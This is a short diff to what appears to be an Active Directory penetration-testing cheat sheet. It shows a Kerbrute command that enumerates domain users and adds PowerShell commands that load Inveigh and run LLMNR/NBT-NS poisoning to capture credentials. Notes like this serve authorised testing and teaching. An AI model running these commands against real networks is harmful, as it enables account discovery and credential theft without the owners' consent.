@@ -28,4 +28,10 @@ Enumerate AD Users with Kerbrute:
 ```
 kerbrute userenum -d <domain_name> --dc <dc_ip> jsmith.txt -o valid_ad_user_accounts
 ```
+Using Inveigh for LLMNR/NBT-NS request poisoning
+```
+Import-Module .\inveigh.ps1
+(Get-Command Invoke-Inveigh).Parameters
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
 
